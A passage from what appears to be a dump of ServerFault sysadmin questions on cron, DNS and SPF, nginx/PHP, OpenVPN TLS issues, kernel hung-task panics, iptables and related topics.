<p>Why doesn't <code>env</code> work inside cronjobs, and how can I fix this?</p>
","<scripting><cron><freebsd><shell-scripting>","2016-03-19 12:55:37"
"979769","Can an administrator see what I do in a remote desktop environment?","<p>Can an administrator see what I do in a remote desktop environment? 
Is it possible at all, does it depend on certain programs?</p>
","<security><remote-desktop>","2019-08-19 06:25:38"
"935488","Does AWS charge for CPU Usage?","<p>I am considering getting <code>t3.medium</code> Type EC2 run Web Server (Apache, PHP, MySQL) and it also make a lot of use of data processing (PHP script running in the background making a lot of use between MySQL and API connection)</p>

<p>If a CPU usage spike to 90%-100% for 3 hours no-stop - will I get charged extra for CPU Usage?</p>
","<amazon-ec2><cpu-usage>","2018-10-14 19:39:40"
"979785","Build Docker image with a future view of RPM upgrade","<p>My aim is to build a docker image for my application, the core part of the application is installed through RPM during the image build.</p>

<p>Suppose I've built my docker image with 'application-version-1.rpm' file and a container is running with this image. After one or two month back developers released a new rpm with patch 'application-version-2.rpm', I need to install/upgrade this rpm file inside the running container. as this container is running on production, how can I update my image with existing data and with the newly released rpm file. Any Idea on this.</p>

<p>Note: I need to stop an application service to install/upgrade the new rpm file. The Entrypoint in my docker image is the application service. So if I stop the application service, it will stop the container.</p>
","<centos><docker><rpm><docker-compose><docker-swarm>","2019-08-19 09:10:43"
"764855","Redirect certain HTTPS url with squid","<p>When passing all http and https traffic through squid3, is it possible if a user requests <code>http://www.example.com</code> I could redirect to a different url?</p>

<p>Would this only be possible for HTTP or HTTPS too?</p>

<p>Thanks</p>
","<squid>","2016-03-19 23:56:20"
"764871","Understanding how to use APNIC resources or how to get all subnet per country","<p>I'm trying to get an up-to-date list of IPv4 ranges assigned to a country.</p>

<p>I use <code>http://ftp.apnic.net/apnic/stats/apnic/delegated-apnic-latest</code> to get the list then filter by country extension.</p>

<p>Let's take China.
<code>
curl 'http://ftp.apnic.net/apnic/stats/apnic/delegated-apnic-latest' | grep ipv4 | grep CN | awk -F\| '{ printf(""%s/%d\n"", $4, 32-log($5)/log(2)) }' &gt; chnroute.txt
</code>
gives us the list of IPv4 for China if I'm not mistaken.
So far so good.</p>

<p>But some IP ranges seems to be missing from this list.</p>

<p>Let's focus on the <code>106.0.0.0/8</code> range for the sake of this example.</p>

<p>We can know the whole range is allocated to Asia Pacific from this page <code>https://www.apnic.net/publications/research-and-insights/apnic-resource-range</code></p>

<p>Excerpt:
<code>
APNIC allocates resources in the following ranges within the Asia Pacific region:
...
106.0.0.0/8
...
</code></p>

<p>Looking at the list online (<code>http://ftp.apnic.net/apnic/stats/apnic/delegated-apnic-latest</code>), we can see:
<code>
apnic|TW|ipv4|106.1.0.0|65536|20110323|allocated
apnic|CN|ipv4|106.2.0.0|131072|20110321|allocated
apnic|CN|ipv4|106.4.0.0|262144|20110321|allocated
</code>
OK, but what about <code>106.3.0.0</code> ?</p>

<p>APNIC Whois can give us the answer: <code>https://wq.apnic.net/whois-search/static/search.html?query=106.3.0.0/24</code></p>

<p>Excerpt:
<code>
inetnum:    106.3.0.0 - 106.3.127.255
netname:    CNISP-UNION
descr:  CNISP-Union Technology (Beijing) Co., Ltd
</code>
Oups, this seems to belong to China as well.</p>

<p>So why isn't it listed in <code>http://ftp.apnic.net/apnic/stats/apnic/delegated-apnic-latest</code> ???
Looking at <code>ftp://ftp.apnic.net/apnic/stats/apnic/</code> one can find some other resources, but there doesn't seem to be anything more complete.</p>

<p>How can I make sense of this? Do I have to understand <code>ASN</code> information listed in this file to get a complete list?</p>
","<ip>","2016-03-20 04:07:08"
"855436","firewalld masquerade control","<p>for various reasons I have had to adopt CentOS 7 as a public facing firewall machine implementing NAT and a few other bits and pieces.</p>

<p>Seems easy enough.</p>

<p>My basic strategy is to assign the outside interface to the ""Drop"" zone for max security and the inside interface to the ""Internal"" zone in firewalld, I then add masquerade to the Drop zone and NAT appears to work from Inside->Outside (Internal->Drop) just fine.</p>

<p>However, I have not yet found a way to block certain ports from translating from in->out, or in other words; I cannot find an elegant (or even working way) to stop firewalld from translation based on destination port for the trusted network. So my goal would be to say, do not masquerade outbound port 100/tcp (example).</p>

<p>Is there a way to do this? Or am I going about this all wrong?</p>
","<centos7><firewalld><masquerade>","2017-06-13 06:52:54"
"855449","Advantages of more routers?","<p>I want to know what advantages or disadvantages are of adding more routers in network topology?</p>

<p>First example:
<a href=""https://i.sstatic.net/qTtxH.png"" rel=""nofollow noreferrer"">Topology</a></p>

<p>Second example: <a href=""https://i.sstatic.net/Xs4lH.png"" rel=""nofollow noreferrer"">Topology</a></p>

<p>Is it more secure? If it is, how and why?</p>
","<networking><routing><router><cloud><openstack>","2017-06-13 07:34:21"
"935582","Forbidden Invalid CSRF Token +monit","<p>I have installed monit on AWS ec2 and it working fine. But when I try to restart the nginx service through monit UI,i got an error like ""Forbidden Invalid CSRF Token +monit"".</p>

<p>My configuration </p>

<pre><code>check process nginx with pidfile /var/run/nginx.pid
   start program = ""/etc/init.d/mysql start""
   stop program = ""/etc/init.d/mysql stop""
</code></pre>
","<linux><monitoring><monit>","2018-10-15 13:08:11"
"764920","Virtual disk backup: rsync alternative?","<p>We currently use rsync to backup virtual disks to another computer.<br>
Rsync is slower than direct copy, but overwrite only modified parts in the destination files. This allow to make snapshots to have backup history, so we have several weeks of history with only 3.6 TB storage (source files are 1.6 TB).</p>

<p>Beside being slow, the main problem is rsync is often unable to do its job on big files, especially when they contains lots of identical data (ie zeros on the unused areas). It hangs forever.</p>

<p>We tested xdelta and xdelta3 but they are not efficient with big files.<br>
We tested rdiff but this is not the right tool.<br>
We tested open-vcdiff, also not the right tool.</p>

<p>We don't need a tool able to find similar data within the whole file. We only need to compare files block per block, and transfert them only when they differ.</p>

<p><strong>Question:</strong> which tool can we use to compare 2 files block per block, and transfer the differences?</p>
","<virtual-machines><rsync><file-transfer>","2016-03-20 16:28:33"
"979872","ACCIDENT - just totally lost the permission to my server","<p>I was trying to change a folder owner user from root to jenkins, and accidently did chown on ALL of the filesystem recursively. now I ended up without any permission.</p>

<pre><code>root@vps412690:/# ls
-bash: /bin/ls: Permission denied
</code></pre>

<p>I can't even use the command chmod, no permission to use it.</p>

<p>I can't even log in to my server.</p>

<pre><code> /bin/bash: Permission denied
</code></pre>

<p>Any idea?</p>
","<linux><debian><permissions><debian-jessie>","2019-08-19 18:10:46"
"979912","How to connect to an Hyper-V VM?","<p>I just treat a Hyper-V VM which has just been created as an ordinary Windows. I enable remote desktop connection as usual. However it fails to connect to the VM from other computers.</p>

<p>TIA</p>
","<windows><remote-desktop>","2019-08-20 02:50:35"
"855539","Why is my email being sent through a strange hostname?","<p>A client's email is handled by G Suite. When I check senderscore.org a strange sending IP and hostname (mail.jbsgroup.ie) appears amongst other Google-related hostnames. This particular domain belongs to another organisation in the locality. Can someone explain to me why is it appearing here and should I be worried?</p>

<p><a href=""https://www.senderscore.org/lookup.php?lookup=mullanlighting.com&amp;validLookup=true"" rel=""nofollow noreferrer"">https://www.senderscore.org/lookup.php?lookup=mullanlighting.com&amp;validLookup=true</a></p>
","<email><hostname>","2017-06-13 14:35:25"
"935660","how to create a DNS SPF record with long text","<p>Our email hosting company provided a SPF records which is too long.  I can't put all into one record.  what can I do?  </p>

<p>Thanks in advance.</p>

<p>David</p>
","<dns-hosting>","2018-10-15 22:41:26"
"979969","CENTOS, problems to identify why a user is using so much space","<p>I am having disk space issues with my CentOS server, a single user is using up to 1,7tb of data, or it is what the du -sh* /home command is telling. But when you enter the user folder and use the du -hscx * command, it tells you that the user is  in fact using 480gb of space. I simply can't identify what is using the extra 1.3tb of space. Is there anyone here who knows how to deal with this problem? </p>

<p>Thank you very much</p>
","<centos><disk-space-utilization>","2019-08-20 11:20:47"
"765077","What should the owner of `.` and `..` directories be?","<p>A few questions about the <code>.</code> and <code>..</code> directories:</p>

<pre><code>ls -la

drwxr-xr-x  3 root root 4096 Mar 21 12:47 .
drwxr-xr-x 60 root root 4096 Mar 15 14:36 ..
</code></pre>

<ol>
<li><p>Are <code>.</code> and <code>..</code> actually directories or are they like symlinks?</p></li>
<li><p>Which user/group should own those directories? For example, in a website document root directory where everything is owned by a specific user, should <code>.</code> and <code>..</code> also be owned by that user?</p></li>
<li><p>Will there be any problems if you change the ownership or permissions of those directories to something incorrect or overly strict?</p></li>
</ol>
","<linux><permissions><directory>","2016-03-21 12:58:43"
"855639","SPF Record Fails - How to verify Server IP Address and managing multiple SPF records","<p>I'm trying to verify the mail sent by our server. With our current DNS settings, sending mail from our server shows an <strong>SPF Neutral</strong> response. </p>

<p>I tried adding a combination of my server's IP and Domain. </p>

<pre><code>v=spf1 a mx ipv4:XXX.XX.XXX.XX -all
v=spf1 include:mydomain.com -all
</code></pre>

<p>Both these records showed no change, all mail sent from the server was still Neutral. So I tried combining all my existing SPF records like so: </p>

<pre><code>v=spf1 a mx include:mydomain.com ipv4:XXX.XX.XXX.XX include:cmail1.com include:mail.zendesk.com -all
</code></pre>

<p>I tested sending mail again and now get a <strong>SPF Fail</strong> response. </p>

<p>I've looked extensively online and I can't see how to fix my DNS entries so I can get a  PASS on the SPF records. I don't know if I need additional CNAME, A, MX, or I'm missing something entirely. </p>

<p>I'm using a Plesk server with a fixed IPv4 address and using CloudFlare to manage my DNS and Name Servers.  </p>

<p>Here is what a full fail response looks like: </p>

<pre><code>SPF:    FAIL with IP XXX.XX.XXX.XX
spf=fail (google.com: domain of accounts@mydomain.com does not designate XXX.XX.XXX.XX as permitted sender) smtp.mailfrom=accounts@mydomain.com
Received-SPF: fail (google.com: domain of accounts@mydomain.com does not designate XXX.XX.XXX.XX as permitted sender) client-ip=XXX.XX.XXX.XX;
spf=fail (google.com: domain of accounts@mydomain.com does not designate XXX.XX.XXX.XX as permitted sender) smtp.mailfrom=accounts@mydomain.com
</code></pre>
","<spf><mx-record><cname-record>","2017-06-14 02:46:23"
"980078","OS recommendation for Oracle XE on a virtual machine?","<p>I'm after advice on the best way to proceed, still new to some of this:</p>

<p>I'm looking into deploying a virtual machine solely for handling a copy of oracle database XE on it. Currently we are solely running a virtual windows 2012 R2 server with Microsoft Server SQL with all users running windows 10 pro connecting to it.</p>

<p>I've run into an issue where I'm most likely force to setup a lightweight oracle database. I'm trying to avoid expensive licensing and I'm after recommendations on what OS to use for the VM. I'm not too familiar with linux, but it might be the right avenue?</p>

<p>Users will be running a program that needs to connect to the oracle DB to query it and return results. This database will then be updated weekly having to download external data via oracle .dmp files (hence why I'm forced to use oracle).</p>

<p>Any recommendations, alternatives or pointers to head in the right direction are greatly appreciated, thanks.</p>
","<linux><windows><windows-server-2012-r2><virtual-machines><oracle>","2019-08-21 03:25:37"
"855654","Set up nginx + php to serve php files from home directories","<p>Here is the relevant part of my nginx.conf, which does not work for php files that are located in the home directories of the users:</p>

<pre><code>  location ~ ^/~(.+?)(/.*)?$ {
     alias /usr/home/$1/www$2;
     autoindex on;
    }

   # Serve user directories php files
    location ~ ^/~(.+?)(/.*\.php)$ {
        alias /usr/home/$1/www;
        try_files $2 =404;
        fastcgi_split_path_info ^(.+\.php)(.*)$;
        fastcgi_pass unix:/var/run/php-fpm.sock;
        fastcgi_index index.php;
        fastcgi_intercept_errors on;
        include fastcgi_params;
        fastcgi_param SCRIPT_NAME /~$1$fastcgi_script_name;
        }

    location ~ \.php$ {
         try_files $uri =404;
         fastcgi_split_path_info ^(.+\.php)(/.+)$;
         fastcgi_pass unix:/var/run/php-fpm.sock;
         fastcgi_index index.php;
         fastcgi_param SCRIPT_FILENAME $request_filename;
         include fastcgi_params;       
        }
</code></pre>
","<nginx><php><php-fpm><freebsd><home-directory>","2017-06-14 05:33:36"
"855721","MySQL Versioning bring all schemas to the same baseline","<p>So, I'm introducing Flyway into our environment to have all schema changes in version control, so I can automate any changes.</p>

<p>The issue is that I have multiple DBs (let's say 30) that all have different versions of the schemas. I'm looking for a tool that would help me bring everything to a common baseline, eg. compare tables and do the necessary alters. The differences are not big - mainly missing columns and indexes.</p>
","<mysql><versioning>","2017-06-14 10:47:05"
"765179","How to log all commands run on Linux including their arguments (parameters)?","<p>How can I log all commands executed on Linux, including their command-line arguments (parameters)?</p>

<p>So, for example, if someone runs:</p>

<pre><code>rm -rf /tmp/foo
</code></pre>

<p>I would see a log entry similar to this:</p>

<pre><code>2016-01-01 18:00:00 user=bob command='rm -rf /tmp/foo'
</code></pre>

<p>And not just this:</p>

<pre><code>2016-01-01 18:00:00 user=bob command='rm'
</code></pre>

<p>I have only been able to find uses of <code>auditd</code> which don't log command-line arguments (parameters). Is there a way to properly configure <code>auditd</code> to record this? It looks like FreeBSD has a <a href=""https://www.freebsd.org/cgi/man.cgi?query=audit_control&amp;sektion=5&amp;manpath=freebsd-release-ports"" rel=""noreferrer"">way to set an <code>argv</code> policy</a>, but this doesn't seem to be present in Debian derivatives.</p>
","<linux><audit><auditd>","2016-03-21 19:47:40"
"855754","Hyper-V: Create DHCP-Server for every network","<p>I want to install some virtual machines like ubuntu and centos on my Windows 10 Hyper-V.  </p>

<p>I created a new network switch in Hyper-V only for connections between the Windows Host and the virtual machines - like internal network. I find on all virtual maschines the new interface. To get a connection I want to use a DHCP-Server only for the client subnet like 192.168.100.0/24, but I don't find some DHCP-Server settings for my internal network-switch. My virtual-maschines don't receive an ip configuration above an DHCP-Server, so I must set up a manual IP configration. </p>

<p>Has Hyper-V an option to enable a DHCP-Server for a network-switch or need all virtual maschines a manual IP configuration? </p>

<p>Volker</p>
","<networking><hyper-v><windows-10>","2017-06-14 13:26:04"
"765195","Fully Qualified Domain Name of VPS","<p>I'm really confused by FQDN.
So there is this file on my debian machine <code>/etc/hosts</code>.
What exactly goes in there?</p>

<p>Say my VPS is located at ipadress: 39.22.11.99
And i have a couple of domains all pointing to this ip adress. Let's say:
<code>domainA.com</code>, <code>domainB.com</code>, <code>domainC.com</code></p>

<p>Those 3 domains do each server another purpose and are correctly configured with Nginx to point to the correct data say: websiteA, websiteB, websiteC</p>

<p>I have one mail server running on my VPS working and all. Yet somehow i think my <code>/etc/hosts</code> file is not configured correctly as all the mail goes into my spam folder even while i have an SSL certificate for all 3 domains and subdomains.</p>

<p>How would one configure his <code>/etc/hosts</code> file?
And should virtual hosts/users help me sending mails from different domains?</p>

<p>For now my <code>/etc/hosts</code> file looks like this:</p>

<pre><code>127.0.0.1    localhost           SomeAlias
39.22.11.99  domainA.com         SomeAlias
39.22.11.99  mail.domainA.com    SomeAlias
39.22.11.99  domainB.com         SomeAlias
39.22.11.99  domainC.com         SomeAlias    
</code></pre>
","<debian><vps><hostname><fqdn>","2016-03-21 21:26:08"
"765214","Cross platform job/task scheduler","<p>We have a mix of Linux, OSX and Windows servers that use crontab, Windows Task Scheduler, etc to run a bunch of bash/windows scripts, rsync commands, etc.</p>

<p>I would like to replace these OS specific schedulers with a centrally controlled system to get a getter overview, preferably something with a web console.</p>

<p>I found <a href=""https://en.wikipedia.org/wiki/List_of_job_scheduler_software"" rel=""nofollow noreferrer"">this</a> list of software on wikipedia which is, to put it mildly, overwhelming. I'm hoping someone could help me narrow it down a little, or suggest something else.</p>

<p>The requirements are as follows:</p>

<ul>
<li>Web based console for configuration, execution, etc</li>
<li>Time based triggers similar to crontab or windows scheduler. Ideally also possible to select days in a calendar as we are a seasonal business which is open weekends only during spring/autumn, all week during summer in addition to Easter. Right now we have to manually adjust the windows task scheduler as the season progress.</li>
<li>Can start scripts on remote machines for all major platforms (Linux, OSX, Windows)</li>
<li>Possible to view logs from scripts on remote machines (some outputs to stdout, others to a specific logfile). Retain logfiles for all executions.</li>
<li>Alerting mechanism if a job fails, preferably with some regex testing on the stdout as not all executable use exit codes as expected.</li>
</ul>

<p>We only have 15-20 jobs all up, so nothing too fancy is necessary.</p>

<p>With many thanks,</p>

<p>Geir</p>
","<linux><windows><task-scheduler>","2016-03-22 01:21:00"
"765217","Install new G Skill Ripsaw X RAM into HP Proliant ML10 v2 causes black screen and long beep","<p>So I have a HP Proliant ML10 v2 and 3x4Gb G Skill Ripsaw X DDR3-1600 PC3-12800 1.5V. The computer does not show POST and then proceeds to a long beep. I removed the new RAM and boot and then everything is OK again.</p>

<p>Here is the RAM: <a href=""http://www.newegg.com/Product/Product.aspx?Item=N82E16820231428"" rel=""nofollow noreferrer"">http://www.newegg.com/Product/Product.aspx?Item=N82E16820231428</a>. I'm sure that it is unbuffed DIMM.</p>

<p>I think it might be a problem with:
1. Defective RAM (unlikely but might happen)
2. BIOS</p>
","<memory><hp-proliant>","2016-03-22 01:48:57"
"855826","Can I reuse a HTTPS certificate from letsencrypt on my docker private registry?","<p>I have an HAProxy server that's exposed on the internet. I've used a subdomain such as registry.mydomain.com to create letsencrypt certificates, enabling encrypted connections.</p>

<p>Now, I want to use HAProxy to forward traffic from that URL to some docker swarm on other computers. In that swarm, I am running a Docker Registry, which in turns is asking for such an encryption certificate.</p>

<p>I've tried to reuse the same I got from HAProxy. Unfortunately, when the traffic goes through the HAProxy in to the Docker Registry container, I get that error message:</p>

<blockquote>
  <p>Error response from daemon: Get <a href=""https://[swarm-ip]:5000/v1/users/"" rel=""nofollow noreferrer"">https://[swarm-ip]:5000/v1/users/</a>: x509:
  cannot validate certificate for [swarm-ip] because it doesn't contain
  any IP SANs</p>
</blockquote>

<p>As a programmer trying to do networking stuff, I feel like there's something missing here but I just can't figure it out.</p>
","<https><haproxy><docker><lets-encrypt><docker-registry>","2017-06-14 19:28:30"
"980270","What hardware specs is needed to serve 100,000 clients on OpenVpn?","<p>Serving vpn clients (tcp connections) with OpenVpn server relies on what ? Or how can we calculate the clients count with hardware specs ?</p>

<p>Does it rely on server bandwidth speed, like if we have a server with 1 GB (1024MB/PS) we can serve 1024 user (every user can get 1MB)? Or something else?</p>
","<vpn><openvpn><tcp><android>","2019-08-22 08:15:40"
"936017","Disable root servers in bind","<p>I installed a simple bind server on fedora 28.</p>

<p>By default dns-queries for which it has no answers are sent to the root servers.
However I want them to go to the openDNS servers.</p>

<p>I have removed the zone ""."" entry, removed named.ca, configured forwarders but still the queries keep going to the root servers. I simply don't understand why it keeps ignoring the settings.</p>

<p>I have tried with putting the forwarders in the ""."" zone, disabling dnssec. Nothing works.</p>

<p>This is the config I have:</p>

<pre><code>acl ""trusted"" { 192.168.0.10; 192.168.0.11; 192.168.0.0/24; };


options {
    listen-on port 53 { 127.0.0.1; 192.168.0.10; };
#   listen-on-v6 port 53 { ::1; };
    directory ""/var/named"";
    dump-file ""/var/named/data/cache_dump.db"";
    statistics-file ""/var/named/data/named_stats.txt"";
    memstatistics-file ""/var/named/data/named_mem_stats.txt"";
    secroots-file   ""/var/named/data/named.secroots"";
    recursing-file  ""/var/named/data/named.recursing"";
        allow-transfer { 192.168.0.11; };
    allow-query     { trusted; };
    forwarders  { 208.69.38.205; 8.8.4.4; }; 

    recursion yes;

    dnssec-enable yes;
    dnssec-validation yes;

    managed-keys-directory ""/var/named/dynamic"";

    pid-file ""/run/named/named.pid"";
    session-keyfile ""/run/named/session.key"";

    /* https://fedoraproject.org/wiki/Changes/CryptoPolicy */
    include ""/etc/crypto-policies/back-ends/bind.config"";
};

logging {
        channel default_debug {
                file ""data/named.run"";
                severity dynamic;
        };
};

include ""/etc/named.rfc1912.zones"";
include ""/etc/named.root.key"";
include ""/etc/named/named.conf.local"";
</code></pre>
","<centos><bind><fedora><root>","2018-10-17 18:16:25"
"855953","Keep domain on separate server?","<p>is it possible to move a site to a new server while keeping the domain on the old server? So, the site would have a new IP but the domain is still hosted on the old server without changing the DNS records. Many thanks. </p>
","<domain-name-system><configuration><domain><ip>","2017-06-15 10:51:06"
"765549","Virtual machine with separate desktop accounts","<p>On our Centos-6.5 server, I want to install a temporary windows xp guest using virtual machines for windows applications. Thing is, I want to run the virtual machine in background and each windows user should be able to use remote desktop to connect to his/her windows account.</p>

<p>I tried VirtualBox and enabled the remote display and started the machine in headless mode. Problem is, all users see a single desktop with the remote display feature. In other words, if administrator logs in the windows account, then every user that connect to the IP:PORT with remote dsktop application will see the administrator's desktop.</p>

<p>Any way to fix that? Any alternative for that?</p>
","<windows><virtual-machines><virtualbox><centos6.5>","2016-03-23 10:00:29"
"980565","TLS handshake fails when traffic goes through OpenVPN tunnel","<p>I have an OpenVPN server in US and a client in Europe. When connected all traffic is routed through VPN tunnel. A problem has been detected - for some HTTPS websites connection fails. I will present 3 cases. First one - it just gets stuck:</p>

<pre><code>$ curl -v 'https://serverfault.com'
* Rebuilt URL to: https://serverfault.com/
*   Trying 151.101.129.69...
* TCP_NODELAY set
* Connected to serverfault.com (151.101.129.69) port 443 (#0)
* ALPN, offering h2
* ALPN, offering http/1.1
* successfully set certificate verify locations:
*   CAfile: /etc/ssl/certs/ca-certificates.crt
  CApath: /etc/ssl/certs
* (304) (OUT), TLS handshake, Client hello (1):
</code></pre>

<p>The second case - it shows an error:</p>

<pre><code>$ curl -v 'https://www.catan.com/'
*   Trying 217.160.0.164...
* TCP_NODELAY set
* Connected to www.catan.com (217.160.0.164) port 443 (#0)
* ALPN, offering h2
* ALPN, offering http/1.1
* successfully set certificate verify locations:
*   CAfile: /etc/ssl/certs/ca-certificates.crt
  CApath: /etc/ssl/certs
* (304) (OUT), TLS handshake, Client hello (1):
* (304) (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
* TLSv1.2 (IN), TLS handshake, Server finished (14):
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
* TLSv1.2 (OUT), TLS change cipher, Client hello (1):
* TLSv1.2 (OUT), TLS handshake, Finished (20):
* OpenSSL SSL_connect: SSL_ERROR_SYSCALL in connection to www.catan.com:443 
* stopped the pause stream!
* Closing connection 0
curl: (35) OpenSSL SSL_connect: SSL_ERROR_SYSCALL in connection to www.catan.com:443
</code></pre>

<p>And the last case - all good:</p>

<pre><code>$ curl -v 'https://www.duckduckgo.com/'
*   Trying 79.125.105.113...
* TCP_NODELAY set
* Connected to www.duckduckgo.com (79.125.105.113) port 443 (#0)
* ALPN, offering h2
* ALPN, offering http/1.1
* successfully set certificate verify locations:
*   CAfile: /etc/ssl/certs/ca-certificates.crt
  CApath: /etc/ssl/certs
* (304) (OUT), TLS handshake, Client hello (1):
* (304) (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
* TLSv1.2 (IN), TLS handshake, Server finished (14):
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
* TLSv1.2 (OUT), TLS change cipher, Client hello (1):
* TLSv1.2 (OUT), TLS handshake, Finished (20):
* TLSv1.2 (IN), TLS handshake, Finished (20):
* SSL connection using TLSv1.2 / ECDHE-RSA-AES128-GCM-SHA256
* ALPN, server accepted to use h2
* Server certificate:
*  subject: C=US; ST=Pennsylvania; L=Paoli; O=Duck Duck Go, Inc.; CN=*.duckduckgo.com
*  start date: Aug  9 00:00:00 2019 GMT
*  expire date: Oct 30 12:00:00 2020 GMT
*  subjectAltName: host ""www.duckduckgo.com"" matched cert's ""*.duckduckgo.com""
*  issuer: C=US; O=DigiCert Inc; CN=DigiCert SHA2 Secure Server CA
*  SSL certificate verify ok.
* Using HTTP2, server supports multi-use
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
* Using Stream ID: 1 (easy handle 0x5587b19d93f0)
&gt; GET / HTTP/2
&gt; Host: www.duckduckgo.com
&gt; User-Agent: curl/7.58.0
&gt; Accept: */*
&gt; 
* Connection state changed (MAX_CONCURRENT_STREAMS updated)!
&lt; HTTP/2 301 
&lt; server: nginx
&lt; date: Sat, 24 Aug 2019 14:12:57 GMT
&lt; content-type: text/html
&lt; content-length: 178
&lt; location: https://duckduckgo.com/
&lt; strict-transport-security: max-age=31536000
&lt; expires: Sun, 23 Aug 2020 14:12:57 GMT
&lt; cache-control: max-age=31536000
&lt; 
&lt;html&gt;
&lt;head&gt;&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt;
&lt;body bgcolor=""white""&gt;
&lt;center&gt;&lt;h1&gt;301 Moved Permanently&lt;/h1&gt;&lt;/center&gt;
&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
* Connection #0 to host www.duckduckgo.com left intact
</code></pre>

<p>What could be the cause? If additional information is needed please just ask.</p>
","<networking><ssl><openvpn><curl>","2019-08-24 14:16:06"
"980595","Kernel panic issue: How to fix hung_task_timeout_secs and blocked for more than 300 seconds?","<p>My server is <em>CentOS7 64bit</em> going under <code>kernel panic</code> issue and <em>rebooted</em> after everyday around 7 to 8am.
Here is part of dmesg </p>

<pre><code>[  536.606448] tun: (C) 1999-2004 Max Krasnyansky &lt;maxk@qualcomm.com&gt;
[82341.807403] INFO: task sync:6493 blocked for more than 300 seconds.
[82341.807406]       Tainted: P           O 3.14.39ltsi-ayan-130.0.33 #1
[82341.807407] ""echo 0 &gt; /proc/sys/kernel/hung_task_timeout_secs"" disables this message.
[82341.807408] sync            D ffffffff81a0b3c0     0  6493      1 0x00000000
[82341.807410]  ffff8801ed563d80 0000000000000086 0000000000009000 ffff880308cb4800
[82341.807412]  ffff8803f962b000 ffff8801ed563fd8 ffff880308cb4800 ffff8803f922f600
[82341.807413]  ffff8801ed563d60 ffff8801ed563e98 7fffffffffffffff ffff8801ed563e90
[82341.807415] Call Trace:
[82341.807421]  [&lt;ffffffff81802029&gt;] schedule+0x29/0x70
[82341.807422]  [&lt;ffffffff81801169&gt;] schedule_timeout+0x199/0x280
[82341.807426]  [&lt;ffffffff81085d42&gt;] ? __queue_delayed_work+0xa2/0x1b0
.
.
.
[82341.807867] Code: 00 00 48 8d 86 38 c0 ff ff 48 89 d1 0f 01 c8 65 48 8b 04 25 70 a8 00 00 48 8b 80 38 c0 ff ff a8 08 75 08 b1 01 4c 89 e0 0f 01 c9 &lt;65&gt; 48 8b 04 25 70 a8 00 00 83 a0 3c c0 ff ff fb 0f ae f0 65 48 
[82341.808450] Kernel panic - not syncing: hung_task: blocked tasks
[82341.814824] CPU: 0 PID: 75 Comm: khungtaskd Tainted: P           O 3.14.39ltsi-ayan-130.0.33 #1
</code></pre>

<p>What I understood from dmesg, <em>sync</em> is a process with <em>pid-6490</em> waiting for DISK operation and blocked for 300s because DISK is hogging by other process. <em>sync</em> goes under process state D (uninterruptible sleep).</p>

<p>Year back when first time I saw panic issue resolved by tweaking <code>sysctl.conf</code> file then issue went away. Guided by website <a href=""https://www.blackmoreops.com/2014/09/22/linux-kernel-panic-issue-fix-hung_task_timeout_secs-blocked-120-seconds-problem/"" rel=""nofollow noreferrer"">https://www.blackmoreops.com/2014/09/22/linux-kernel-panic-issue-fix-hung_task_timeout_secs-blocked-120-seconds-problem/</a></p>

<p>Here is current config of /etc/sysctl.conf</p>

<pre><code>kernel.hung_task_timeout_secs = 300
vm.dirty_background_ratio = 5 
vm.dirty_ratio = 10
</code></pre>

<p>I have configured daily <strong>cron job</strong> task for data backup of <code>pgsql</code> DB. Data size around 200GB and some other task.</p>

<p><strong>Server details:</strong></p>

<pre><code>Filesystem                Size  Used Avail Use% Mounted on
total                     3.7T  1.1T  2.6T  30%
RAM: 16GB
</code></pre>
","<linux><centos7><kernel-panic>","2019-08-25 05:11:23"
"765691","How to allow use of fopen and getimagesize on urls without schemes e.g. // instead of http://","<p>I set open_basedir in the site conf.  but I noticed errors ""open_basedir restriction in effect"" when using getimagesize with uri that start with //  instead of http://</p>

<p>how to allow this?  Can adding // to open_basedir be a security risk?</p>
","<nginx><php>","2016-03-23 18:23:44"
"856387","virtual machine on azure virtual machine","<p>Can I run another virtual machines inside Microsoft azure virtual machine? 16 cores, 56gb of ram, but I got errors about virtualization:</p>

<p>Hyper-V install feature:</p>

<p>""Hyper-V cannot be installed: The processor does not have the required virtualization capabilities.""</p>

<p>VirtualBox error message:
""VT-x is not available""</p>

<p>can I somehow resolve this? Im running windows server 2016 r2</p>
","<virtual-machines><hyper-v><azure><windows-server-2016>","2017-06-17 14:41:09"
"856393","Route 53 going from www domain version to naked","<p>My domain used to use <code>www</code>, which I was ableto get rid of using Route 53. 
Now if I type <code>abcd.example</code>, it correctly shows what used to be on <code>www.abcd.example</code>.</p>

<p>The problem is, I have a handful of links  with the www version, which will no longer respond, although its routed to the EC2 instance.</p>

<p>What can I do with this?</p>
","<amazon-route53>","2017-06-17 15:18:01"
"980802","Why can't open 1060 port on debian?","<p>In my os--debian, i want to open port 1060.</p>

<pre><code>~# iptables -I INPUT -p tcp --dport 1060 -j ACCEPT
</code></pre>

<p>Now to check it with <code>iptables -L -n</code>.</p>

<pre><code>~# iptables -L -n
Chain INPUT (policy ACCEPT)
target prot opt source destination
ACCEPT tcp -- 0.0.0.0/0 0.0.0.0/0 tcp dpt:1060

Chain FORWARD (policy ACCEPT)
target prot opt source destination

Chain OUTPUT (policy ACCEPT)
target prot opt source destination
</code></pre>

<p>To scan port with tool <code>nmap</code>.</p>

<pre><code>~# nmap 127.0.0.1

Starting Nmap 7.40 ( https://nmap.org ) at 2019-08-26 23:02 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.0000080s latency).
Not shown: 998 closed ports
PORT STATE SERVICE
53/tcp open domain
3306/tcp open mysql

Nmap done: 1 IP address (1 host up) scanned in 1.67 seconds
</code></pre>

<p>Why can't open the port 1060 on my debian?</p>
","<iptables><port>","2019-08-27 03:25:18"
"765808","Grant SFTP permission and limit Ubuntu user to only one directory","<p>I'm trying to let create a user with SFTP permissions to only one directory (that is not his home directory). When he connects through a SFTP client I want him to land on this directory and I don't want him to be able to view any other directory unless it's a sub-directory. I'm using Ubuntu 12.04.</p>

<p>I followed the steps below:</p>

